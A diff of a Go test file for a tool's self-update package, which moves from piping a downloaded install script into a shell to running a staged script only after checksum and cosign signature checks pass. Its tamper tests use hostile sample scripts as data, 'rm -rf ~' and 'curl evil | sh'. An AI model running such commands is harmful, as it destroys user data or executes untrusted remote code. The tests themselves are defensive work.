@@ -5,9 +5,12 @@ package selfupdate
 
 import (
 	"bytes"
+	"crypto/sha256"
+	"encoding/hex"
 	"errors"
 	"path/filepath"
 	"reflect"
+	"regexp"
 	"strings"
 	"testing"
 )
@@ -121,31 +124,32 @@ func TestNeedsUpdate_AnyInstalledToolOffTheTag(t *testing.T) {
 	}
 }
 
-func TestInstallerArgs_WholeFamilyPinnedToTheTagIntoTheBinDir(t *testing.T) {
+func TestInstallerArgs_RunsTheStagedScriptForTheFamilyPinnedToTheTag(t *testing.T) {
 	// Native paths: binDir comes from os.Executable, and its prefix from filepath.Dir.
 	binDir := filepath.FromSlash("/home/you/.local/bin")
-	argv := InstallerArgs("rigsmith/rigsmith", "v1.28.0", binDir)
-	if len(argv) != 3 || argv[0] != "sh" || argv[1] != "-c" {
-		t.Fatalf("argv = %v, want sh -c <script>", argv)
+	got := InstallerArgs("rigsmith/rigsmith", "v1.28.0", binDir, "/tmp/x/install.sh")
+	want := []string{
+		"env", "RIGSMITH_VERSION=v1.28.0", "RIGSMITH_REPO=rigsmith/rigsmith",
+		"RIGSMITH_BIN_DIR=" + binDir, "RIGSMITH_INSTALL=" + filepath.Dir(binDir),
+		"sh", "/tmp/x/install.sh", "all",
 	}
-	want := "curl -fsSL https://raw.githubusercontent.com/rigsmith/rigsmith/v1.28.0/scripts/install.sh" +
-		" | RIGSMITH_VERSION='v1.28.0' RIGSMITH_REPO='rigsmith/rigsmith'" +
-		" RIGSMITH_BIN_DIR='" + binDir + "' RIGSMITH_INSTALL='" + filepath.Dir(binDir) + "' sh -s all"
-	if argv[2] != want {
-		t.Fatalf("script =\n %s\nwant\n %s", argv[2], want)
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("argv =\n %q\nwant\n %q", got, want)
 	}
 }
 
-func TestInstallerArgs_QuotesTheDirAndSkipsThePrefixOffABin(t *testing.T) {
-	script := InstallerArgs("acme/fork", "v2.0.0", "/opt/you's tools")[2]
-	if !strings.Contains(script, `RIGSMITH_BIN_DIR='/opt/you'\''s tools'`) {
-		t.Fatalf("bin dir not shell-quoted: %s", script)
+func TestInstallerArgs_PassesTheDirVerbatimAndSkipsThePrefixOffABin(t *testing.T) {
+	argv := InstallerArgs("acme/fork", "v2.0.0", "/opt/you's tools", "/tmp/install.sh")
+	joined := strings.Join(argv, "|")
+	// env(1) takes NAME=value as one argument: nothing to quote, nothing to inject.
+	if !strings.Contains(joined, "|RIGSMITH_BIN_DIR=/opt/you's tools|") {
+		t.Fatalf("bin dir not passed as one argument: %q", argv)
 	}
-	if strings.Contains(script, "RIGSMITH_INSTALL=") {
-		t.Fatalf("a dir not named bin has no prefix to give an older installer: %s", script)
+	if strings.Contains(joined, "RIGSMITH_INSTALL=") {
+		t.Fatalf("a dir not named bin has no prefix to give an older installer: %q", argv)
 	}
-	if !strings.Contains(script, "raw.githubusercontent.com/acme/fork/v2.0.0/scripts/install.sh") || !strings.Contains(script, "RIGSMITH_REPO='acme/fork'") {
-		t.Fatalf("fork repo not carried through: %s", script)
+	if !strings.Contains(joined, "|RIGSMITH_REPO=acme/fork|") {
+		t.Fatalf("fork repo not carried through: %q", argv)
 	}
 }
 
@@ -206,17 +210,54 @@ func TestMoveLines(t *testing.T) {
 	}
 }
 
+// testScript is the release's install.sh in testEnv, and testSums its
+// checksums file.
+var testScript = []byte("#!/bin/sh\necho installing\n")
+
+func testSums() []byte {
+	return []byte(sha256Hex(testScript) + "  install.sh\n" + strings.Repeat("0", 64) + "  rig_1.28.0_darwin_arm64.tar.gz\n")
+}
+
 // testEnv is shiprig run from /home/you/.local/bin with the rest of the family
-// behind it, and an installer that moves everything to the tag.
+// behind it, a release whose checksums are signed and whose installer matches
+// them, and an installer that moves everything to the tag.
 func testEnv(installed map[string]string, tag string) (*Env, *[][]string) {
 	dir := "/home/you/.local/bin"
 	var calls [][]string
+	assets := map[string][]byte{
+		ChecksumsAsset: testSums(),
+		SignatureAsset: []byte(`{"bundle":"ok"}`),
+		InstallerAsset: testScript,
+	}
 	e := &Env{
 		Tool: "shiprig", Version: "1.23.1", GOOS: "darwin", Repo: "rigsmith/rigsmith",
 		Exe: dir + "/shiprig", Resolved: dir + "/shiprig",
 		FetchLatestTag: func() (string, error) { return tag, nil },
 		ProbeVersion:   fakeBin(dir, installed),
+		Fetch: func(url string) ([]byte, error) {
+			name := url[strings.LastIndex(url, "/")+1:]
+			if want := ReleaseAssetURL("rigsmith/rigsmith", tag, name); url != want {
+				return nil, errors.New("unexpected URL " + url)
+			}
+			if b, ok := assets[name]; ok {
+				return b, nil
+			}
+			return nil, ErrNotFound
+		},
+		VerifySignature: func(_, bundle []byte) (bool, error) {
+			if string(bundle) != `{"bundle":"ok"}` {
+				return false, errors.New("signature mismatch")
+			}
+			return true, nil
+		},
+		StageScript: func(script []byte) (string, func(), error) {
+			if string(script) != string(testScript) {
+				return "", nil, errors.New("staged a script that was not the verified one")
+			}
+			return "/tmp/staged/install.sh", func() {}, nil
+		},
 	}
+	assetsOf[e] = assets
 	e.Install = func(argv []string) error {
 		calls = append(calls, argv)
 		for _, t := range Family {
@@ -237,7 +278,7 @@ func TestRun_UpdatesTheWholeFamilyAndReportsWhatMoved(t *testing.T) {
 	if len(*calls) != 1 {
 		t.Fatalf("installer ran %d times, want once for the family", len(*calls))
 	}
-	if want := InstallerArgs("rigsmith/rigsmith", "v1.28.0", filepath.Dir(e.Exe)); !reflect.DeepEqual((*calls)[0], want) {
+	if want := InstallerArgs("rigsmith/rigsmith", "v1.28.0", filepath.Dir(e.Exe), "/tmp/staged/install.sh"); !reflect.DeepEqual((*calls)[0], want) {
 		t.Fatalf("installer argv = %v, want %v", (*calls)[0], want)
 	}
 	for _, want := range []string{"rig        v1.27.0 → v1.28.0", "shiprig    v1.23.1 → v1.28.0", "codexrig   installed v1.28.0"} {
@@ -319,5 +360,98 @@ func TestRun_KeepsTheGuards(t *testing.T) {
 				t.Fatalf("output missing %q:\n%s", tc.want, out.String())
 			}
 		})
+	}
+}
+
+// assetsOf lets a test reach testEnv's release assets to tamper with them.
+var assetsOf = map[*Env]map[string][]byte{}
+
+func sha256Hex(b []byte) string {
+	sum := sha256.Sum256(b)
+	return hex.EncodeToString(sum[:])
+}
+
+func TestVerifyChecksum(t *testing.T) {
+	sums := testSums()
+	if err := VerifyChecksum(sums, "install.sh", testScript); err != nil {
+		t.Fatalf("a matching script failed: %v", err)
+	}
+	if err := VerifyChecksum(sums, "install.sh", []byte("#!/bin/sh\nrm -rf ~\n")); err == nil || !strings.Contains(err.Error(), "does not match") {
+		t.Fatalf("a tampered script passed: %v", err)
+	}
+	if err := VerifyChecksum(sums, "shiprig_1.28.0_darwin_arm64.tar.gz", nil); err == nil || !strings.Contains(err.Error(), "not listed") {
+		t.Fatalf("an unlisted file passed: %v", err)
+	}
+	// sha256sum's binary-mode marker.
+	if err := VerifyChecksum([]byte(sha256Hex(testScript)+" *install.sh\n"), "install.sh", testScript); err != nil {
+		t.Fatalf("binary-mode line not read: %v", err)
+	}
+}
+
+// Nothing is installed unless the checksums carry a valid signature and the
+// installer matches them.
+func TestRun_RefusesAnUnverifiedRelease(t *testing.T) {
+	cases := map[string]struct {
+		mutate func(*Env)
+		want   string
+	}{
+		"tampered script": {func(e *Env) {
+			assetsOf[e][InstallerAsset] = []byte("#!/bin/sh\ncurl evil | sh\n")
+		}, "install.sh does not match checksums.txt"},
+		"missing signature": {func(e *Env) {
+			delete(assetsOf[e], SignatureAsset)
+		}, "has no signature"},
+		"invalid signature": {func(e *Env) {
+			assetsOf[e][SignatureAsset] = []byte(`{"bundle":"forged"}`)
+		}, "does not verify"},
+		"missing checksums": {func(e *Env) {
+			delete(assetsOf[e], ChecksumsAsset)
+		}, "couldn't download checksums.txt"},
+		"no cosign, signature required": {func(e *Env) {
+			e.VerifySignature = func(_, _ []byte) (bool, error) { return false, nil }
+			e.RequireSignature = true
+		}, "requires it"},
+	}
+	for name, tc := range cases {
+		t.Run(name, func(t *testing.T) {
+			e, calls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
+			tc.mutate(e)
+			err := Run(&bytes.Buffer{}, false, *e)
+			if err == nil || !strings.Contains(err.Error(), tc.want) {
+				t.Fatalf("err = %v, want one containing %q", err, tc.want)
+			}
+			if len(*calls) != 0 {
+				t.Fatal("the installer ran on an unverified release")
+			}
+		})
+	}
+}
+
+func TestRun_WithoutCosignChecksTheChecksumsAndSaysSo(t *testing.T) {
+	e, calls := testEnv(map[string]string{"rig": "1.23.1"}, "v1.28.0")
+	e.VerifySignature = func(_, _ []byte) (bool, error) { return false, nil }
+	var out bytes.Buffer
+	if err := Run(&out, false, *e); err != nil {
+		t.Fatal(err)
+	}
+	if len(*calls) != 1 {
+		t.Fatal("the installer should still run on verified checksums")
+	}
+	if !strings.Contains(out.String(), "cosign isn't installed") || !strings.Contains(out.String(), RequireSignatureEnv) {
+		t.Fatalf("the fallback isn't said plainly:\n%s", out.String())
+	}
+}
+
+func TestSigningIdentity_PinsTheReleaseWorkflowOfTheRepo(t *testing.T) {
+	re := regexp.MustCompile(SigningIdentity("rigsmith/rigsmith"))
+	for id, want := range map[string]bool{
+		"https://github.com/rigsmith/rigsmith/.github/workflows/release.yml@refs/tags/v1.29.0": true,
+		"https://github.com/rigsmith/rigsmith/.github/workflows/release.yml@refs/heads/main":   true,
+		"https://github.com/rigsmith/rigsmith/.github/workflows/ci.yml@refs/heads/main":        false,
+		"https://github.com/acme/rigsmith/.github/workflows/release.yml@refs/tags/v1.29.0":     false,
+	} {
+		if got := re.MatchString(id); got != want {
+			t.Errorf("identity %s matched = %v, want %v", id, got, want)
+		}
 	}
 }
